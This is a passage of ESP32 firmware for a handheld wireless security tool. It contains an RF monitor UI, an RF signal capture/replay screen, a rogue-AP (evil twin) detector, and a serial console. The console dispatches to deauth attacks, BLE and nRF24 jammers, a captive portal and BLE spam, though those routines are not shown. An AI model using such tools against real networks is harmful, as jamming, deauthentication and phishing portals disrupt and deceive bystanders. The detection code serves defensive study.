          break;
      }
    }
  }
}

void drawRFMonitorFresh() {
  tft.fillScreen(COLOR_BG);
  
  String title = "rf monitor - ";
  if (selectedRFType == RF_NRF24) title += "nrf24";
  else if (selectedRFType == RF_SUBGHZ) title += "subghz";
  
  drawTerminalHeader(title.c_str());
  
  int y = HEADER_HEIGHT + 5;
  
  if (selectedRFType == RF_SUBGHZ) {
    // SubGHz - Under Development
    tft.setTextSize(2);
    tft.setTextColor(COLOR_ORANGE);
    tft.setCursor((240 - 84) / 2, y + 60);
    tft.println("UNDER");
    tft.setCursor((240 - 168) / 2, y + 85);
    tft.println("DEVELOPMENT");
    
    y += 140;
    tft.setTextSize(1);
    tft.setTextColor(COLOR_TEXT);
    tft.setCursor((240 - 174) / 2, y);
    tft.println("SubGHz monitoring will be");
    y += 12;
    tft.setCursor((240 - 180) / 2, y);
    tft.println("available in future update");
    
  } else if (selectedRFType == RF_NRF24) {
    // NRF24 - Working Monitor
    
    // Compact stats line
    tft.setTextSize(1);
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.setCursor(SIDE_MARGIN, y);
    tft.print("Frequency:");
    
    tft.setTextColor(COLOR_CYAN);
    tft.setCursor(75, y);
    tft.print("2.4GHz");
    
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.setCursor(130, y);
    tft.print("Range:");
    
    tft.setTextColor(COLOR_YELLOW);
    tft.setCursor(175, y);
    tft.print("0-125");
    
    y += 15;
    tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
    
    // Draw wave area grid
    int waveStartY = y + 5;
    int waveHeight = 120;
    int centerY = waveStartY + waveHeight / 2;
    
    // Horizontal grid lines
    for (int i = 1; i < 4; i++) {
      int gridY = waveStartY + (i * waveHeight / 4);
      for (int x = 0; x < 240; x += 5) {
        tft.drawPixel(x, gridY, COLOR_DARK_GREEN);
      }
    }
    
    // Center line (brighter)
    for (int x = 0; x < 240; x += 3) {
      tft.drawPixel(x, centerY, 0x2945);
    }
    
    // Bottom separator after wave area
    y = waveStartY + waveHeight + 5;
    tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
    y += 8;
    
    // Status message (centered, below waves)
    tft.setTextSize(1);
    tft.setTextColor(COLOR_CYAN);
    int msgWidth = 156;
    tft.setCursor((255 - msgWidth) / 2, y);
    tft.print("Monitoring RF spectrum");
    
    y += 15;
    
    // Channel info (centered)
    tft.setTextColor(COLOR_DARK_GREEN);
    msgWidth = 168;
    tft.setCursor((260 - msgWidth) / 2, y);
    tft.print("Channels: 2400-2525 MHz");
  }
  
  drawCenteredButton("[STOP]", COLOR_RED);
}

// ==================== HANDLE RF CAPTURE TOUCH ====================
void handleRFCaptureTouch(int x, int y) {
  // Back/Stop button
  if (y > 300) {
    if (rfCaptureActive) {
      stopRFCapture();
      drawRFCapture();
    } else {
      currentState = RF_TYPE_MENU;
      hoveredIndex = -1;
      drawRFTypeMenu();
    }
    return;
  }
  
  // Scroll through captured signals
  if (capturedSignalCount > 0 && y > HEADER_HEIGHT + 40 && y < 280) {
    const int MAX_ITEMS = 11;
    int totalPages = (capturedSignalCount + MAX_ITEMS - 1) / MAX_ITEMS;
    
    if (totalPages > 1) {
      int currentPage = rfCaptureScrollOffset / MAX_ITEMS;
      currentPage = (currentPage + 1) % totalPages;
      rfCaptureScrollOffset = currentPage * MAX_ITEMS;
      drawRFCapture();
    }
  }
}

void handleRFReplayTouch(int x, int y) {
  // Back button
  if (y > 300) {
    currentState = RF_TYPE_MENU;
    hoveredIndex = -1;
    selectedSignalIndex = -1;
    drawRFTypeMenu();
    return;
  }
  
  // Replay button (if signal selected)
  if (selectedSignalIndex >= 0 && y >= 255 && y <= 285 && x >= 60 && x <= 180) {
    replayRFSignal();
    return;
  }
  
  // Signal selection from list
  if (capturedSignalCount > 0 && y > HEADER_HEIGHT + 40 && y < 250) {
    int listY = HEADER_HEIGHT + 40;
    const int ITEM_HEIGHT = 20;
    int clickedIndex = (y - listY) / ITEM_HEIGHT;
    int actualIndex = rfCaptureScrollOffset + clickedIndex;
    
    if (actualIndex >= 0 && actualIndex < capturedSignalCount) {
      selectedSignalIndex = actualIndex;
      Serial.printf("[*] Selected signal %d: %s\n", 
                    actualIndex, 
                    capturedSignals[actualIndex].description.c_str());
      drawRFReplay();
    }
  }
}

// ==================== HANDLE RF MONITOR TOUCH ====================
void handleRFMonitorTouch(int x, int y) {
  static bool* initFlag = nullptr;
  
  currentState = RF_TYPE_MENU;
  hoveredIndex = -1;
  drawRFTypeMenu();
}


void updateAPHistory(String ssid, uint8_t* bssid, int32_t rssi, uint8_t channel) {
  // Find existing entry
  int existingIndex = -1;
  for (int i = 0; i < apHistoryCount; i++) {
    if (apHistoryList[i].ssid == ssid && 
        memcmp(apHistoryList[i].bssid, bssid, 6) == 0) {
      existingIndex = i;
      break;
    }
  }
  
  unsigned long now = millis();
  
  if (existingIndex >= 0) {
    // Update existing
    APHistory* ap = &apHistoryList[existingIndex];
    
    // Track signal fluctuations
    if (abs(ap->rssi - rssi) > 15) {
      ap->signalFluctuations++;
    }
    
    // Track channel changes
    if (ap->channel != channel) {
      ap->channelChanges++;
    }
    
    ap->rssi = rssi;
    ap->channel = channel;
    ap->lastSeen = now;
    
  } else if (apHistoryCount < 50) {
    // Add new entry
    APHistory* ap = &apHistoryList[apHistoryCount];
    ap->ssid = ssid;
    memcpy(ap->bssid, bssid, 6);
    ap->rssi = rssi;
    ap->channel = channel;
    ap->firstSeen = now;
    ap->lastSeen = now;
    ap->inWhitelist = isWhitelisted(bssid);
    ap->signalFluctuations = 0;
    ap->channelChanges = 0;
    
    apHistoryCount++;
  }
}

bool isWhitelisted(uint8_t* bssid) {
  for (int i = 0; i < whitelistCount; i++) {
    if (memcmp(whitelistedBSSIDs[i], bssid, 6) == 0) {
      return true;
    }
  }
  return false;
}

void checkForRogueAP(String ssid, uint8_t* bssid, int32_t rssi, uint8_t channel) {
  // Skip whitelisted APs
  if (isWhitelisted(bssid)) return;
  
  // Look for duplicate SSIDs with different BSSIDs
  for (int i = 0; i < apHistoryCount; i++) {
    APHistory* other = &apHistoryList[i];
    
    // Same SSID but different BSSID
    if (other->ssid == ssid && memcmp(other->bssid, bssid, 6) != 0) {
      
      // Calculate confidence score
      uint8_t confidence = 0;
      String reason = "";
      
      int32_t signalDiff = abs(rssi - other->rssi);
      
      // Pattern 1: One AP much stronger (likely attacker nearby)
      if (signalDiff > 20) {
        confidence += 40;
        reason = "Strong signal diff";
      }
      
      // Pattern 2: Same channel (classic evil twin)
      if (channel == other->channel) {
        confidence += 30;
        reason += " + Same channel";
      }
      
      // Pattern 3: Suspiciously strong signal
      if (rssi > -40 || other->rssi > -40) {
        confidence += 20;
        reason += " + Very close";
      }
      
      // Pattern 4: Rapid appearance
      unsigned long now = millis();
      if ((now - other->firstSeen) < 5000) {
        confidence += 10;
        reason += " + Sudden appear";
      }
      
      // If confidence high enough, log as rogue
      if (confidence >= 50) {
        addRogueAP(ssid, other->bssid, bssid, other->rssi, rssi, 
                   other->channel, channel, confidence, reason);
      }
    }
  }
  
  // Check for suspicious behavior patterns
  for (int i = 0; i < apHistoryCount; i++) {
    APHistory* ap = &apHistoryList[i];
    
    if (memcmp(ap->bssid, bssid, 6) == 0) {
      // Pattern 5: Excessive channel changes
      if (ap->channelChanges > 3) {
        uint8_t confidence = min(70, 40 + (ap->channelChanges * 10));
        addRogueAP(ssid, ap->bssid, bssid, ap->rssi, rssi, 
                   ap->channel, channel, confidence, "Channel hopping");
      }
      
      // Pattern 6: Extreme signal fluctuations (AP being moved?)
      if (ap->signalFluctuations > 5) {
        uint8_t confidence = min(60, 30 + (ap->signalFluctuations * 5));
        addRogueAP(ssid, ap->bssid, bssid, ap->rssi, rssi, 
                   ap->channel, channel, confidence, "Signal instability");
      }
    }
  }
}

void addRogueAP(String ssid, uint8_t* legitBSSID, uint8_t* rogueBSSID, 
                int32_t legitRSSI, int32_t rogueRSSI, 
                uint8_t legitCh, uint8_t rogueCh,
                uint8_t confidence, String reason) {
  
  // Check if already logged
  for (int i = 0; i < rogueAPCount; i++) {
    if (detectedRogues[i].ssid == ssid &&
        memcmp(detectedRogues[i].rogueBSSID, rogueBSSID, 6) == 0) {
      // Update existing
      detectedRogues[i].detectionCount++;
      detectedRogues[i].lastSeen = millis();
      detectedRogues[i].rogueRSSI = rogueRSSI;
      
      // Increase confidence with repeated detections
      detectedRogues[i].confidenceScore = min(100, confidence + (detectedRogues[i].detectionCount * 5));
      return;
    }
  }
  
  // Add new rogue if space available
  if (rogueAPCount < 20) {
    RogueAP* rogue = &detectedRogues[rogueAPCount];
    rogue->ssid = ssid;
    memcpy(rogue->legitimateBSSID, legitBSSID, 6);
    memcpy(rogue->rogueBSSID, rogueBSSID, 6);
    rogue->legitimateRSSI = legitRSSI;
    rogue->rogueRSSI = rogueRSSI;
    rogue->legitimateChannel = legitCh;
    rogue->rogueChannel = rogueCh;
    rogue->firstSeen = millis();
    rogue->lastSeen = millis();
    rogue->detectionCount = 1;
    rogue->confidenceScore = confidence;
    rogue->suspiciousReason = reason;
    
    rogueAPCount++;
    
    // Alert
    Serial.printf("\n[!] ROGUE AP DETECTED!\n");
    Serial.printf("    SSID: %s\n", ssid.c_str());
    Serial.printf("    Confidence: %d%%\n", confidence);
    Serial.printf("    Reason: %s\n", reason.c_str());
    
    addToConsole("ROGUE: " + ssid);
  }
}

void displayRogueAPDetector() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("rogue ap detector");
  
  // Live indicator
  static bool blink = false;
  blink = !blink;
  tft.fillCircle(220, 12, 3, blink ? COLOR_RED : COLOR_DARK_GREEN);
  
  // Stats bar - COMPACT
  int statsY = HEADER_HEIGHT + 5;
  tft.setTextSize(1);
  tft.setTextColor(COLOR_CYAN);
  tft.setCursor(SIDE_MARGIN, statsY);
  tft.print("Scanning...");
  
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(100, statsY);
  tft.printf("APs:");
  tft.setTextColor(COLOR_GREEN);
  tft.printf("%d", apHistoryCount);
  
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(155, statsY);
  tft.printf("Rogues:");
  tft.setTextColor(rogueAPCount > 0 ? COLOR_RED : COLOR_GREEN);
  tft.printf("%d", rogueAPCount);
  
  // Column headers
  int listY = HEADER_HEIGHT + 22;
  tft.drawFastHLine(0, listY - 2, 240, COLOR_DARK_GREEN);
  
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setTextSize(1);
  tft.setCursor(SIDE_MARGIN, listY);
  tft.print("NETWORK");
  tft.setCursor(130, listY);
  tft.print("CONF");
  tft.setCursor(175, listY);
  tft.print("DETC");
  
  tft.drawFastHLine(0, listY + 12, 240, COLOR_DARK_GREEN);
  listY += 15;
  
  // Calculate safe display area
  const int BACK_BUTTON_Y = 305;
  const int SAFE_BOTTOM = BACK_BUTTON_Y - 25;
  const int ITEM_HEIGHT = 32;
  const int MAX_ITEMS = (SAFE_BOTTOM - listY) / ITEM_HEIGHT;
  
  if (rogueAPCount == 0) {
    // No rogues detected - show status
    tft.setTextSize(1);
    tft.setTextColor(COLOR_GREEN);
    tft.setCursor(SIDE_MARGIN, listY + 30);
    tft.print("â No rogue APs detected");
    
    tft.setTextColor(COLOR_TEXT);
    tft.setCursor(SIDE_MARGIN, listY + 50);
    tft.print("Network appears clean");
    
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.setCursor(SIDE_MARGIN, listY + 70);
    tft.printf("Monitoring %d APs...", apHistoryCount);
    
    tft.setCursor(SIDE_MARGIN, listY + 90);
    tft.print("Looking for:");
    
    tft.setTextColor(COLOR_TEXT);
    tft.setCursor(SIDE_MARGIN + 5, listY + 105);
    tft.print("• Duplicate SSIDs");
    tft.setCursor(SIDE_MARGIN + 5, listY + 117);
    tft.print("• Channel hopping");
    tft.setCursor(SIDE_MARGIN + 5, listY + 129);
    tft.print("• Signal anomalies");
    tft.setCursor(SIDE_MARGIN + 5, listY + 141);
    tft.print("• Evil Twin attacks");
    
  } else {
    // Display detected rogues with pagination
    
    // Ensure scroll offset is valid
    if (rogueScrollOffset >= rogueAPCount) {
      rogueScrollOffset = max(0, rogueAPCount - MAX_ITEMS);
    }
    if (rogueScrollOffset < 0) {
      rogueScrollOffset = 0;
    }
    
    int displayCount = min(rogueAPCount - rogueScrollOffset, MAX_ITEMS);
    
    for (int i = 0; i < displayCount; i++) {
      int idx = rogueScrollOffset + i;
      int y = listY + (i * ITEM_HEIGHT);
      
      // Stop if too close to back button
      if (y + ITEM_HEIGHT > SAFE_BOTTOM) break;
      
      RogueAP* rogue = &detectedRogues[idx];
      
      // Alert icon with color based on confidence
      uint8_t conf = rogue->confidenceScore;
      uint16_t alertColor;
      if (conf >= 80) alertColor = COLOR_RED;
      else if (conf >= 60) alertColor = COLOR_ORANGE;
      else alertColor = COLOR_YELLOW;
      
      tft.setTextColor(alertColor);
      tft.setTextSize(1);
      tft.setCursor(SIDE_MARGIN, y + 2);
      tft.print("[!]");
      
      // SSID (line 1)
      tft.setTextColor(COLOR_TEXT);
      tft.setCursor(SIDE_MARGIN + 18, y + 2);
      String displaySSID = rogue->ssid;
      if (displaySSID.length() > 15) displaySSID = displaySSID.substring(0, 14) + "~";
      tft.print(displaySSID);
      
      // Confidence percentage
      uint16_t confColor;
      if (conf >= 80) confColor = COLOR_RED;
      else if (conf >= 60) confColor = COLOR_ORANGE;
      else confColor = COLOR_YELLOW;
      
      tft.setTextColor(confColor);
      tft.setCursor(130, y + 2);
      tft.printf("%d%%", conf);
      
      // Detection count
      tft.setTextColor(COLOR_CYAN);
      tft.setCursor(175, y + 2);
      tft.printf("x%d", rogue->detectionCount);
      
      // BSSID comparison (line 2)
      tft.setTextColor(COLOR_DARK_GREEN);
      tft.setCursor(SIDE_MARGIN + 18, y + 12);
      tft.print("L:");
      tft.printf("%02X:%02X:%02X", 
                 rogue->legitimateBSSID[3],
                 rogue->legitimateBSSID[4],
                 rogue->legitimateBSSID[5]);
      
      tft.setTextColor(COLOR_RED);
      tft.setCursor(SIDE_MARGIN + 65, y + 12);
      tft.print("R:");
      tft.printf("%02X:%02X:%02X", 
                 rogue->rogueBSSID[3],
                 rogue->rogueBSSID[4],
                 rogue->rogueBSSID[5]);
      
      // RSSI and Channel info (line 3)
      tft.setTextColor(COLOR_CYAN);
      tft.setCursor(SIDE_MARGIN + 18, y + 22);
      tft.printf("Ch%d/%d", rogue->legitimateChannel, rogue->rogueChannel);
      
      tft.setTextColor(COLOR_YELLOW);
      tft.setCursor(SIDE_MARGIN + 55, y + 22);
      tft.printf("%ddB/%ddB", rogue->legitimateRSSI, rogue->rogueRSSI);
      
      // Threat reason (abbreviated)
      tft.setTextColor(COLOR_ORANGE);
      tft.setCursor(130, y + 22);
      if (rogue->suspiciousReason.indexOf("signal diff") >= 0 || 
          rogue->suspiciousReason.indexOf("Strong") >= 0) {
        tft.print("SIGNAL");
      } else if (rogue->suspiciousReason.indexOf("channel") >= 0 || 
                 rogue->suspiciousReason.indexOf("hopping") >= 0) {
        tft.print("CH-HOP");
      } else if (rogue->suspiciousReason.indexOf("close") >= 0 || 
                 rogue->suspiciousReason.indexOf("Very") >= 0) {
        tft.print("CLOSE");
      } else if (rogue->suspiciousReason.indexOf("instability") >= 0) {
        tft.print("UNSTBL");
      } else {
        tft.print("SUSP");
      }
    }
    
    // Scroll indicator (if needed)
    if (rogueAPCount > MAX_ITEMS) {
      int scrollY = SAFE_BOTTOM + 2;
      tft.setTextColor(COLOR_DARK_GREEN);
      tft.setTextSize(1);
      
      int currentPage = (rogueScrollOffset / MAX_ITEMS) + 1;
      int totalPages = (rogueAPCount + MAX_ITEMS - 1) / MAX_ITEMS;
      char scrollText[30];
      sprintf(scrollText, "Page %d/%d [Tap scroll]", currentPage, totalPages);
      int textWidth = strlen(scrollText) * 6;
      int centerX = (240 - textWidth) / 2;
      
      tft.setCursor(centerX, scrollY);
      tft.print(scrollText);
    }
  }
  
  // Legend at bottom (compact)
  int legendY = 240;
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, legendY);
  tft.print("L=Legit R=Rogue CONF=Risk%");
  
  legendY += 12;
  tft.setCursor(SIDE_MARGIN, legendY);
  tft.print("DETC=Times seen");
  
  drawCenteredButton("[STOP]", COLOR_RED);
}

// ==================== Serial Commands ====================

void handleSerialCommands() {
  if (Serial.available()) {
    String cmd = Serial.readStringUntil('\n');
    cmd.trim();
    cmd.toLowerCase();
    
    Serial.println("CMD: " + cmd);
    
    if (cmd == "help") {
      Serial.println("\n=== P4WNC4K3 Console ===");
      Serial.println("scan - Scan WiFi networks");
      Serial.println("deauth - Toggle deauth attack");
      Serial.println("deauthsniff - Toggle deauth sniffer");
      Serial.println("sniffer - Toggle packet sniffer");
      Serial.println("ble - Scan BLE devices");
      Serial.println("blejam - Toggle BLE jammer");
      Serial.println("nrfjam - Toggle nRF24 jammer");
      Serial.println("airtag - Scan for AirTags");
      Serial.println("skimmer - Detect card skimmers");
      Serial.println("portal - Toggle captive portal");
      Serial.println("spam - BLE spam attacks");
      Serial.println("wardrive - Wardriving mode");
      Serial.println("status - Show system status");
      Serial.println("console - Show console on screen");
      Serial.println("clear - Clear console buffer");
      Serial.println("info - System information");
    }
    else if (cmd == "scan") {
      scanWiFiNetworks();
    }
    else if (cmd == "deauth") {
      toggleDeauth();
    }
    else if (cmd == "sniffer") {
      toggleSniffer();
    }
    else if (cmd == "ble") {
      scanBLEDevices();
    }
    else if (cmd == "blejam") {
      toggleBLEJammer();
    }
    else if (cmd == "nrfjam") {
      toggleNRFJammer();
    }
    else if (cmd == "deauthsniff") {
      if (!deauthSnifferActive) {
        currentState = DEAUTH_SNIFFER;
        startDeauthSniffer();
      } else {
        stopDeauthSniffer();
      }
    }
    else if (cmd == "karma") {
      if (!karmaDetectorActive) {
        startKarmaDetector();
      } else {
        stopKarmaDetector();
        currentState = MORE_TOOLS_MENU;
        drawMoreToolsMenu();
      }
    }
    else if (cmd == "airtag") {
      startAirTagScanner();
    }
    else if (cmd == "skimmer") {
      startSkimmerDetector();
    }
    else if (cmd == "portal") {
      toggleCaptivePortal();
    }
    else if (cmd == "wardrive") {
      startWardriving();
    }
    else if (cmd == "status") {
      printStatus();
    }
    else if (cmd == "console") {
      showConsole();
    }
    else if (cmd == "clear") {
      clearConsole();
    }
    else if (cmd == "skull") {
      showSkull = !showSkull;
      Serial.println(showSkull ? "Skull animation ON" : "Skull animation OFF");
    }
    else if (cmd == "info") {
      printSystemInfo();
    }
    else if (cmd == "rogue" || cmd == "rogueap") {
      if (!rogueAPScanActive) {
        startRogueAPDetector();
      } else {
        stopRogueAPDetector();
        currentState = MORE_TOOLS_MENU;
        drawMoreToolsMenu();
      }
    }
    else {
      Serial.println("Unknown command. Type 'help' for commands.");
    }
  }
}

void toggleDeauth() {
  if (!deauthActive) {
    if (networkCount > 0) {
      startDeauth();
      Serial.println("Deauth started");
    } else {
      Serial.println("Scan networks first");
    }
  } else {
    stopDeauth();
    Serial.println("Deauth stopped");
  }
}

void toggleSniffer() {
  if (!snifferActive) {
    snifferScrollOffset = 0;
    packetHistoryIndex = 0;
    startSniffer();
  } else {
    stopSniffer();
    currentState = MAIN_MENU;
    drawMainMenu();
  }
}

void toggleCaptivePortal() {
  if (snifferActive) stopSniffer();
  if (deauthActive) stopDeauth();
  
  WiFi.disconnect();
  delay(100);
  WiFi.mode(WIFI_AP);
  if (!portalActive) {
    if (networkCount > 0) {
      startCaptivePortal();
    } else {
      Serial.println("Scan networks first");
    }
  } else {
    stopCaptivePortal();
  }
}

void toggleBLEJammer() {
  if (!bleJammerActive) {
    startBLEJammer();
  } else {
    stopBLEJammer();
  }
}

void toggleNRFJammer() {
  if (!nrfJammerActive) {
    startNRFJammer();
  } else {
    stopNRFJammer();
  }
}



void printStatus() {
  Serial.println("\n=== System Status ===");
  Serial.printf("Deauth: %s (%d pkts)\n", deauthActive ? "ACTIVE" : "INACTIVE", deauthPacketsSent);
  Serial.printf("Sniffer: %s\n", snifferActive ? "ACTIVE" : "INACTIVE");
  Serial.printf("BLE Jammer: %s (%d pkts)\n", bleJammerActive ? "ACTIVE" : "INACTIVE", bleJamPackets);
  Serial.printf("nRF24 Jammer: %s (%d pkts)\n", nrfJammerActive ? "ACTIVE" : "INACTIVE", nrfJamPackets);
  Serial.printf("Packets: Total=%d, Beacon=%d, Data=%d, Deauth=%d\n", 
                packetCount, beaconCount, dataCount, deauthCount);
  Serial.printf("Portal: %s\n", portalActive ? "ACTIVE" : "INACTIVE");
  Serial.printf("AirTags detected: %d\n", airTagCount);
  Serial.printf("Skimmers detected: %d\n", skimmerCount);
  Serial.printf("Free Heap: %d KB\n", ESP.getFreeHeap() / 1024);
}

void clearConsole() {
  for (int i = 0; i < 15; i++) {
    consoleBuffer[i] = "";
  }
  consoleIndex = 0;
  Serial.println("Console cleared");
}

void printSystemInfo() {
  Serial.println("\n=== System Info ===");
  Serial.printf("Chip: %s\n", ESP.getChipModel());
  Serial.printf("CPU: %d MHz\n", ESP.getCpuFreqMHz());
  Serial.printf("Flash: %d MB\n", ESP.getFlashChipSize() / 1048576);
  Serial.printf("MAC: %s\n", WiFi.macAddress().c_str());
  Serial.printf("SDK: %s\n", ESP.getSdkVersion());
  Serial.printf("nRF24 #1: %s\n", nrf1Available ? "Available" : "Not found");
  Serial.printf("nRF24 #2: %s\n", nrf2Available ? "Available" : "Not found");
}
